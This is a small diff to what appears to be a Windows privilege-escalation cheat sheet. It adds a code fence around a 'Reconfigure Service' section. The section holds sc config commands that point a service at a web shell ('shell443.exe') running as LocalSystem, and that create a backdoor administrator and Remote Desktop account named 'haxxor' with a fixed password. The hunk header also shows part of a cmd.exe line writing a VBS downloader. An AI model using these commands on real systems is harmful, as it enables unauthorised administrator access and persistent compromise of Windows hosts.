@@ -69,9 +69,11 @@ cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo ob
 
 ## Reconfigure Service
 
-
 Reconfigure Service:
+
+```
 sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
 sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
+```
 
 
